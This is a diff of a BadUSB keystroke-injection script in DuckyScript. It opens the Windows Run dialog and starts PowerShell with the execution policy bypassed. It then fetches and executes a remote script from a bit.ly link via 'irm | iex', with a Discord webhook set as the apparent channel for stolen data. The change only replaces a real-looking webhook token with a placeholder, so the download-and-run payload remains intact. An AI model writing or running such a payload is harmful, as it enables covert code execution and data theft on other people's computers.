@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -noexit -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1185172334592655371/r9YAVpnfPK_W5z5D4F0WmkdFO6j7Vo7kSofgED4Ntol0ht1z_ZSMTZkJD7KcdoP30J1V';irm bit.ly/ClankPT | iex
+STRING powershell -noexit -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/"token here"';irm bit.ly/ClankPT | iex
 ENTER
